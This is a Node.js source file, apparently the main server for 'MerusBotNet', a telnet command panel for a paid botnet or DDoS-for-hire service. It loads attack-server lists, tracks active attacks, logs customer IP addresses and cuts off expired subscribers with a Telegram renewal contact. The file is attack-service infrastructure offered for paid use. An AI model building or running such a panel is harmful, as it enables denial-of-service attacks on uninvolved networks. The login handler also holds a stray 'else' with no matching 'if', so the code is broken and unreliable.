const telnet = require('telnet');
const center = require('./utils/center')
const assets = require('./tools/assets')
const userInit = require('./auth/userInit')
const handleCommand = require('./commands/handler')
const size = require('term-size')
const config = require('../config')
const CommonData = require('./common/data')
const title = require('./utils/title')
const { clearWithLogo, welcome, clearWithAuthLogo, clear } = require('./utils/logo')
const fs = require('fs')
const getDays = require('./utils/getDays')
const gradient = require('gradient-string')
const net = require('net');

for(const fileName of fs.readdirSync('DB/servers').filter(x => x.endsWith('.json'))) {
  CommonData.servers[fileName.split('.json')[0]] = require(`../DB/servers/${fileName}`)
}

CommonData.servers[config.GlobalNetworkName] = []

for(const i in CommonData.servers) {
  if(i !== config.GlobalNetworkName) {
    const servers = CommonData.servers[i]
    servers.forEach(server => CommonData.servers[config.GlobalNetworkName].push(server))
  }
}

CommonData.users = require('../DB/users.json')
CommonData.attacks = require('../DB/attacks.json')
CommonData.autorestart = require('../DB/autorestart.json')

require('colors');

require('./intervals/autorestart')
require('./intervals/livelist')

// setInterval(function() {
//   console.log(CommonData.clients.length)
// }, 5000)

setInterval(function() {
  for(const client of CommonData.clients.filter(x => getDays(x.endUnix) < 0)) {
    client.write((title('MerusBotNet | Expired.')))
    client.write('\n\n' + center('Продлить доступ - t.me/pasaju'.bgBrightRed.brightWhite, client.getWidth()) + '\n\n')
    client.end()
  }
  for(const client of CommonData.clients.filter(x => !userInit(x.username, x.password))) {
    client.write((title('MerusBotNet | Account modified or deleted.')))
    client.write('\n\n' + center('Пользователь изменён или удалён, принудительная деаунтефикация.'.bgBrightRed.brightWhite, client.getWidth()) + '\n\n')
    client.end()
  }
}, 5000)

setInterval(function() {
  for(const i in CommonData.attacks.filter(x => Date.now() >= x.end)) {
    CommonData.attacks.splice(i, 1)
  }
  for(const fileName in CommonData.servers) {
    if(fileName.toLowerCase() !== config.GlobalNetworkName.toLowerCase()) {
      fs.writeFileSync(`./DB/servers/${fileName}.json`, JSON.stringify(CommonData.servers[fileName], null, '\t'))
    }
  }
  fs.writeFileSync('./DB/users.json', JSON.stringify(CommonData.users, null, '\t'))
  fs.writeFileSync('./DB/attacks.json', JSON.stringify(CommonData.attacks, null, '\t'))
  fs.writeFileSync('./DB/servers.json', JSON.stringify(CommonData.servers, null, '\t'))
  fs.writeFileSync('./DB/autorestart.json', JSON.stringify(CommonData.autorestart, null, '\t'))
}, 5000)

// Создаем telnet-сервер
const server = telnet.createServer(async (client) => {
  if(client.input?.remoteAddress) {
    client.ip = client.input.remoteAddress.startsWith('::ffff:') ? client.input.remoteAddress.split('::ffff:')[1].trim() : client.input.remoteAddress.trim()
  }

  client.tmp = true

  client.width = 0;
  client.getWidth = () => client.width || size().columns;
  //client.write(assets.getTitle(client, CommonData.clients, CommonData.attacks, config))

  // Создаем интервал, который будет выполняться каждые 1000 миллисекунд
  let intervalId = setInterval(() => {
    if(!client.tmp) client.write(assets.getTitle(client, CommonData.clients, CommonData.attacks, config))
  }, 1000);
  
  client.do.transmit_binary()
  client.do.window_size()

  client.on('window size', function (e) {
    if(client.authorized && !client.processing) {
      if(client.width !== e.width) {
        client.width = e.width
        client.write(clearWithLogo(client))
        client.write(welcome(client))
        client.write(assets.getPromt(client.user))
      }
    }
    client.width = e.width
  })

  client.username = ''
  client.password = ''

  client.write(title('Press Enter.'))
  client.write(clear() + '\n\n\t' + gradient(['#a357eb', '#8B00FF'])('Нажмите клавишу ENTER...') + '\n\n')

  client.on('data', async function(data) {
    if(client.tmp) {
      delete client.tmp
      client.write(assets.getTitle(client, CommonData.clients, CommonData.attacks, config))
      client.write(clearWithAuthLogo(client))
      client.write('\rLogin:'.underline.cyan + " ");
      return
    }
    // преобразуем ввод от пользователя в строку
    const input = data.toString().trim();
    if(input.length < 1 && !client.authorized) {
      if(client.username === '') {
        client.write(clearWithAuthLogo(client))
        return client.write('\rLogin:'.underline.cyan + " ");
      } else if(client.password === '') {
        client.write(clearWithAuthLogo(client))
        return client.write('\rPassword:'.underline.cyan + " ");
      }
    }
  
    if (client.username === '') {
      // логин еще не был введен, сохраняем его
      client.username = input;
      client.write(clearWithAuthLogo(client))
      client.write('\rPassword:'.underline.cyan + " ");
    } else if (client.password === '') {
      // пароль еще не был введен, сохраняем его и авторизуем пользователя
      client.password = input;
      const user = userInit(client.username, client.password)
      if (user) {
        const days = getDays(user.endUnix)
        if(days < 0) {
          client.write((title('MerusBotNet | Expired.')))
          client.write('\n\n' + center('Продлить доступ - t.me/pasaju'.bgBrightRed.brightWhite, client.getWidth()) + '\n\n')
          return client.end()
        }
        for(const tmpClient of CommonData.clients.filter(x => x.username === client.username && x.authorized)) {
          tmpClient.write(title('MerusBotNet | Session closed.'))
          tmpClient.write('\n\n' + center('Выполнен вход в аккаунт. Сессия завершена.'.red.bold, client.getWidth()) + '\n\n')
          tmpClient.end()
        }
        // успешная авторизация, разрешаем доступ к командам
        CommonData.clients.push(client)
        client.authorized = true;
        // client.admin = user.admin;
        // client.endUnix = user.endUnix
        // client.autorestart = user.autorestart
        // client.user.limits = user.limits
        client.user = user

        const dateNow = Date.now()

        client.user.lastOnline = dateNow

        if(!client.user.ipLoggerBypass) {
          if(!client.user.ips) client.user.ips = []
          let userIPObj = client.user.ips.find(j => j.ip === client.ip)
          else userIPObj.lastUnix = dateNow
        }

        client.write(assets.getTitle(client, CommonData.clients, CommonData.attacks, config))
        client.write(clearWithLogo(client));
        client.write(welcome(client))
        client.write(assets.getPromt(client.user))
      } else {
        // неверный логин или пароль, отключаем соединение
        client.write('\n\n\t' + 'Invalid credentials.'.bgRed.brightWhite + '\n\n');
        client.end();
      }
    } else {
      // авторизованный пользователь отправил команду, обработка команд
      if (!client.authorized) {
        // пользователь не авторизован, отключаем соединение
        client.write('Необходима авторизация.\r\n');
        client.end();
        return;
      }

      if(client.processing) return;
      // обработка команд
      if(input.length > 0) client.write(clearWithLogo(client));
      handleCommand(client, input);
    }
  });

  client.on('close', async function(data) {
    clearInterval(intervalId);
    if(client.authorized) {
      const dateNow = Date.now()

      client.user.lastOnline = dateNow

      if(!client.user.ipLoggerBypass) {
        if(!client.user.ips) client.user.ips = []
        let userIPObj = client.user.ips.find(j => j.ip === client.ip)
        if(!userIPObj) client.user.ips.push({ ip: client.ip, lastUnix: dateNow })
        else userIPObj.lastUnix = dateNow
      }

      CommonData.clients.splice(CommonData.clients.indexOf(client), 1)
    }
  })

  client.on('error', async function(data) {
    return
  })

});

// Запускаем сервер на порту 23
server.listen(config.port, () => {
  console.log('Сервер Telnet запущен на порту ' + config.port);
});
